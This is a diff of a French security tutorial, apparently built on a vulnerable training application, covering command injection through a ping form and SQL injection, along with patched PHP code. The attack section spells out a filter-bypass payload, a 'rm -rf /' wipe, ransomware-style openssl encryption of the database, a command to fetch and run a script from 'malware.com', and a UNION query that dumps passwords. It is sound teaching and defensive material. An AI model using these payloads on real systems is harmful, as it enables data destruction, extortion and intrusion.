@@ -65,11 +65,12 @@ Notre objectif dans cette situation va être d'éxécuter du code sur la machine
 
 #### a. Principe de l'injection
 
-On peut supposer que le site a prépapré la commande ```"ping " + champ``` et qu'il ne vérifie pas le contenu du champs entré par l'utilisateur. On va donc essayer le payload ```127.0.0.1 && dir``` pour voir s'il exécuter la seconde partie.
+On peut supposer que le site a prépapré une commande similaire à ```"ping " + champ``` et qu'il ne vérifie pas le contenu du champs entré par l'utilisateur. On va donc essayer le payload ```127.0.0.1 && dir``` pour voir s'il exécuter la seconde partie.
 
 <img src="CommandInjection1.png" width=600/>
 
-Heureusement le site a prévu de retirer tous les ```&&``` ou ```||```. Réessayons avec ```|```. 
+Heureusement le site a prévu de retirer tous les ```&&``` ou ```||```. Réessayons avec ```|``` suivi non pas d'un espace mais de la commande directement. 
+```127.0.0.1 |dir```
 
 <img src="CommandInjection2.png" width=600/>
 
@@ -77,30 +78,86 @@ On a réussi à exécuter une commande non prévue par le site. On peut continue
 
 #### b. Obtention d'informations
 
-En naviguant dans les dossiers à l'aide de ```cd``` et ```dir```, on arrive à retrouver la base de données des utilisateurs que l'on a fouillé avec l'injection SQL. La commande ici est ```127.0.0.1 | dir ../../database```
+En naviguant dans les dossiers à l'aide de ```cd``` et ```dir```, on arrive à retrouver la base de données des utilisateurs que l'on a fouillé avec l'injection SQL. La commande ici est ```127.0.0.1 |dir ../../database```
 
 <img src="CommandInjection3.png" width=600/>
 
 #### c. Mise hors compétition par un compétiteur
 
-Dans la situation où une entreprise concurrente arrive à trouver cette vulnérabilité et veut nous mettre hors compétition ou nous faire perdre notre image, elle pourrait nous faire perdre toutes nos données en exécutant ```127.0.0.1 | sudo rm -rf /```.
+Dans la situation où une entreprise concurrente arrive à trouver cette vulnérabilité et veut nous mettre hors compétition ou nous faire perdre notre image, elle pourrait nous faire perdre toutes nos données en exécutant ```127.0.0.1 |rm -rf /```.
 
 #### d. Demande de rançon
 
-Il serait aussi possible de faire une demande de rançon après avoir crypté la base de donnée trouvée précedemment en utilisant ```127.0.0.1 | openssl enc -aes-256-gcm -salt -in ../../database/sqli.db -out ../../database/sqli.db.enc -pass pass:PassWordChiffrementMechant```.
+Il serait aussi possible de faire une demande de rançon après avoir crypté la base de donnée trouvée précedemment en utilisant ```127.0.0.1 |openssl enc -aes-256-gcm -salt -in ../../database/sqli.db -out ../../database/sqli.db.enc -pass pass:PassWordChiffrementMechant```.
 
 #### e. Installation de Malware
 
-Enfin, on pourrait aussi cacher un malware dans le serveur pour miner pour nous du bitcoin ou quoi que ce soit d'autre en utilisant ```127.0.0.1 | curl https://malware.com/mw.sh``` puis ```127.0.0.1 | chmod +x mw.sh``` et ```127.0.0.1 | ./mw.sh``` où ```mw.sh``` est un malware préalablement créé.
+Enfin, on pourrait aussi cacher un malware dans le serveur pour miner pour nous du bitcoin ou quoi que ce soit d'autre en utilisant ```127.0.0.1 |curl https://malware.com/mw.sh``` puis ```127.0.0.1 |chmod +x mw.sh``` et ```127.0.0.1 |./mw.sh``` où ```mw.sh``` est un malware préalablement créé.
 
 ## Comment se défendre de ces attaques ?
 
 ### Injection SQL
 
+#### Avant
+
+Le code originel est en php. Voici la partie qui nous intéresse :
+```
+$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+
+try
+{
+    $results = $sqlite_db_connection->query($query);
+}
+```
+On remarque bien que si on envoie ```' union select user,password from users#``` dans l'id, la requête exécutée est ```SELECT first_name, last_name FROM users WHERE user_id = '' union select user,password from users#';``` qui renvoie les mots de passe des utilisateurs.
+
+#### Après correction
+
+```
+if(is_numeric( $id )) {
+		$id = intval ($id);
+
+        global $sqlite_db_connection;
+
+        $stmt = $sqlite_db_connection->prepare('SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;' );
+        $stmt->bindValue(':id',$id,SQLITE3_INTEGER);
+        $result = $stmt->execute();
+        $result->finalize();
+        ...
+```
+La première protection est de mettre une limite sur le nombre de ligne renvoyée avec ```LIMIT 1```. Cela évite d'afficher plusieurs données, quoi qu'il arrive.
+
+La seconde protection est de vérifier que ```id``` est un nombre, cela évite de pouvoir écrire ce que l'on veut.
+
 ### Injection de commande
 
+#### Avant
 
+Toujours en php, voici le code qui nous intéresse.
+```
+$cmd = shell_exec( 'ping  -c 4 ' . $target );
+```
+On remarque bien que si on envoie ```127.0.0.1 |dir ../../database```, on obtient ```$cmd = shell_exec( 'ping  -c 4 ' . 127.0.0.1 |dir ../../database ); ```, à savoir que ```.``` est l'opération de concaténation de php. Le ping s'exécute correctement et la seconde partie de la commande, injectée, s'exécute en parallèle.
 
+#### Après correction
 
+Pour faire un ping de manière sûre, voici comment on peut faire :
+```
+$target = $_REQUEST[ 'ip' ];
+$target = stripslashes( $target );
 
+$octet = explode( ".", $target );
 
+// Check IF each octet is an integer
+if( ( is_numeric( $octet[0] ) ) 
+ && ( is_numeric( $octet[1] ) )
+ && ( is_numeric( $octet[2] ) )
+ && ( is_numeric( $octet[3] ) )
+ && ( sizeof( $octet ) == 4 ) )
+ {
+    $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
+
+    $cmd = shell_exec( 'ping  -c 4 ' . $target );
+    ...
+```
+Comme on veut recevoir une ip, et qu'elle a toujours la même forme int.int.int.int, on va essayer de couper au niveau des ```.``` ce qu'on reçoit en morceaux. S'il y a exactement 4 morceaux et qu'ils contiennent tous des entiers, alors seulement on exécute la commande voulue.
